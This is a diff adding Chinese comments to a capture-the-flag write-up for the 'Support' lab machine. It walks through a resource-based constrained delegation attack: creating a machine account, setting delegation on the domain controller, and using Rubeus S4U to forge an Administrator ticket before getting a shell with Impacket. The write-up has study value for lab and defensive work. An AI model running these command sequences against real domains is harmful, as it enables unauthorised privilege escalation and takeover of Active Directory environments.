@@ -75,39 +75,46 @@ https://github.com/GhostPack/Rubeus
 
 
 *Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+//查看域中机器账户配额
 
-*Evil-WinRM* PS C:\Users\support\Documents> . ./PowerView.ps1
+*Evil-WinRM* PS C:\Users\support\Documents> . ./PowerView.ps1 //导入 PowerView 的函数（如 Get-DomainComputer）
 *Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
-
+//查看 DC 的 RBCD 配置
 *Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force) 
-
-*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -identity FAKE-COMP01 
+//创建你控制的计算机账户
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -identity FAKE-COMP01
+//查看新建的计算机账户
 6.配置
 
 *Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
-
+//允许它对 DC 做委派（RBCD）
+//修改 DC 这台计算机对象 的属性：PrincipalsAllowedToDelegateToAccount等价于：msDS-AllowedToActOnBehalfOfOtherIdentity
+//允许 FAKE-COMP01$ 代表任意用户 访问 DC 提供的服务（如 CIFS）
 *Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
-
+//验证配置是否成功（AD 视角）
 *Evil-WinRM* PS C:\Users\support\Documents> . .\PowerView.ps1
 *Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
-
+//用 PowerView 直接查看原始 RBCD 字段； 二进制安全描述符（Security Descriptor） 不能直接看懂
 *Evil-WinRM* PS C:\Users\support\Documents> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
-
+//取出原始二进制数据 存到变量 $RawBytes
 *Evil-WinRM* PS C:\Users\support\Documents> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
-
+//把二进制转成安全描述符对象； 告诉 .NET：用 $RawBytes，从偏移 0 开始，解析成 SecurityDescriptor
 *Evil-WinRM* PS C:\Users\support\Documents> $Descriptor
-
+//查看安全描述符
 *Evil-WinRM* PS C:\Users\support\Documents> $Descriptor.DiscretionaryAcl
-
+//查看 DACL（谁被允许），DACL（访问控制列表）
 得到SecurityIdentifier被设置为我们看到的FAKE-COMP01的SID将AceType设置为AccessAllowed
 
 S4U攻击
 *Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
-
+//算机器账户的 NTLM(hash), 算成：NTLM hash（RC4）,得到S4U 的凭证基础
 *Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:FAKE-COMP01$
 /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
+//S4U 伪造 Administrator 的票据, /msdsspn:cifs/dc.support.htb要访问的服务（文件服务=445）
 
-Rubeus成功地弄到了票
+CIFS = Common Internet File System 本质上就是：Windows 的文件共享协议（SMB）
+\\dc.support.htb\C$
+\\dc.support.htb\ADMIN$
 7.票据转换为Impacket可以使用的格式。这可以通过Impackets TicketConverter.py实现，以及要获取shell，我们可以使用Impackets的psexec.py
 
 [★]$ git clone https://github.com/fortra/impacket.git
